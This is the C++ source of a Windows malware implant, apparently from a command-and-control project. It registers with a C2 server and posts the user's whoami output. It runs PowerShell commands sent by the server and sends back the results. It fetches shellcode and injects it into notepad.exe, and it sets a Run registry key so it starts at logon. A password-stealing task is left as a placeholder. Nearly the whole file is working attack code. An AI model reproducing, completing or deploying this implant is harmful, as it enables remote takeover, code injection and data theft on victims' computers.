#include <windows.h>
#include <string>
#include <iostream>
#include <stdlib.h>
#include "http.h"
#include "exec_shell.h"
#include "aes_gcm.h"
#include "inject.h"
#include "nlohmann/json.hpp"

using json = nlohmann::json;

// implant configurations

// uncomment the following for production
// LPCWSTR c2Domain = L"c2-server-app.herokuapp.com";
// int port = 443;
// BOOL useTLS = TRUE;

// uncomment the following for development
LPCWSTR c2Domain = L"127.0.0.1";
int port = 5000;
BOOL useTLS = FALSE;

LPCWSTR registerURI = L"/agent/register";
LPCWSTR getTaskURI = L"/agent/get_task";
LPCWSTR sendResultURI = L"agent/send_results";
std::string password = "magic_conch";
std::string agentId;
DWORD sleepTime = 10 * 1000;

// generate a random agent id of size digits
std::string generateRandomId(int size) {
    std::string id = "";
    for (int i = 0; i < size; i++) {
        id += std::to_string(rand() % 10);
    }
    return id;
}

// register the agent on the c2 server
BOOL registerAgent() {
    std::string name = exec_shell(CommonCmd::whoami);
    int cpuCount = std::stoi(exec_shell(CommonCmd::cpu_num));
    
    json jsonPayload = {
        {"whoami", name},
        {"agent_id", agentId},
        {"password", password},
        {"cpus", cpuCount}
    };

    std::string jsonString = jsonPayload.dump();
    std::string response = httpPost(c2Domain, port, registerURI, jsonString, useTLS);
    if (response == "Error") {
        return FALSE;
    }
    std::cout << response << std::endl;

    json jsonResponse = json::parse(response);

    if (jsonResponse["status"] == "ok") {
        return TRUE;
    } else {
        return FALSE;
    }
}

// execute the list of commands and send the result back to the server
void executeTasks(std::vector<json> tasks) {
    for (int i = 0; i < tasks.size(); i++) {
        // json task = json::parse(tasks[i]);
        json task = tasks[i];
        if (task["command_type"] == "powershell_cmd") {
            std::string cmd = task["cmd"];
            std::string result = exec_shell(&*( cmd.begin() ));
            std::cout << result << std::endl;

            json jsonResult = {
                {"job_id", task["job_id"]},
                {"agent_id", agentId},
                {"password", password},
                {"results", result}
            };

            std::string jsonString = jsonResult.dump();

            std::string response = httpPost(c2Domain, port, sendResultURI, jsonString, useTLS);

            if (response == "Error") {
                return;
            }

            std::cout << response << std::endl;
        } else if (task["command_type"] == "steal") {
            std::cout << "steal some passwords (placeholder)" << std::endl;
            // add implementation here

            json jsonResult = {
                {"job_id", task["job_id"]},
                {"agent_id", agentId},
                {"password", password},
                {"results", ""}
            };

            std::string jsonString = jsonResult.dump();

            std::string response = httpPost(c2Domain, port, sendResultURI, jsonString, useTLS);

            if (response == "Error") {
                return;
            }

            std::cout << response << std::endl;

        } else if (task["command_type"] == "shellcode") {
            std::string exePath = "C:\\WINDOWS\\System32\\notepad.exe";
            std::string response = httpGet(c2Domain, port, L"/agent/get_shellcode", useTLS);
            std::cout << response.size() << std::endl;
            char* shellcode = &*response.begin();
            std::cout << inject(exePath, shellcode, response.size()) << std::endl;

            json jsonResult = {
                {"job_id", task["job_id"]},
                {"agent_id", agentId},
                {"password", password},
                {"results", ""}
            };

            std::string jsonString = jsonResult.dump();

            std::string response = httpPost(c2Domain, port, sendResultURI, jsonString, useTLS);

            if (response == "Error") {
                return;
            }

            std::cout << response << std::endl;
        } else if (task["command_type"] == "change_config") {
            std::cout << "change some configuration (placeholder)" << std::endl;
            // add implementation here

            json jsonResult = {
                {"job_id", task["job_id"]},
                {"agent_id", agentId},
                {"password", password},
                {"results", ""}
            };

            std::string jsonString = jsonResult.dump();

            std::string response = httpPost(c2Domain, port, sendResultURI, jsonString, useTLS);

            if (response == "Error") {
                return;
            }

            std::cout << response << std::endl;
        }
        
    }
}

// get commands from server and execute them
void getTasksAndExecute() {
    json jsonPayload = {
        {"agent_id", agentId},
        {"password", password}
    };
    std::string jsonString = jsonPayload.dump();

    std::string response = httpPost(c2Domain, port, getTaskURI, jsonString, useTLS);

    if (response == "Error") {
        return;
    }

    json jsonResponse = json::parse(response);

    if (jsonResponse["status"] == "ok") {
        std::cout << jsonResponse["tasks"] << std::endl;
        std::vector<json> tasks = jsonResponse["tasks"];
        executeTasks(tasks);
    } else {
        std::cout << "no tasks at this time" << std::endl;
    }
}

// using run key to make implant run on start up
void persist() {  
    char exepath[MAX_PATH];
    GetModuleFileNameA(0, exepath, MAX_PATH);

    printf("executable path: %s\n", exepath);

    HKEY hKey;
    LSTATUS status = RegOpenKeyA(
        HKEY_CURRENT_USER,
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        &hKey
    );

    if (status != ERROR_SUCCESS) {
        printf("Error %d: unable to open key\n", status);
    }

    status = RegSetValueExA(
        hKey,
        "implant.exe",
        0,
        REG_SZ,
        (BYTE*)exepath,
        strlen(exepath)
    );

    if (status != ERROR_SUCCESS) {
        printf("Error %d: unable to set key\n", status);
    }

    RegCloseKey(hKey);
}

int main(int argc, char* argv[]){

    // use a mutex to prevent multiple instances of the implant
    LPCSTR szUniqueNamedMutex = "magic_conch";
    HANDLE hHandle = CreateMutexA( NULL, TRUE, szUniqueNamedMutex );
    if( ERROR_ALREADY_EXISTS == GetLastError() )
    {
        // Program already running somewhere
        return 0; // Exit program
    }

    persist();

    agentId = generateRandomId(10);
    BOOL registered = FALSE;
    do {
        registered = registerAgent();
    } while (!registered);

    int i = 3;
    while(i > 0) {
        std::cout << "wake up" << std::endl;
        getTasksAndExecute();
        Sleep(sleepTime);
        i--;
    }

    // Upon app closing:
    ReleaseMutex( hHandle ); // Explicitly release mutex
    CloseHandle( hHandle ); // close handle before terminating

    return 0;
}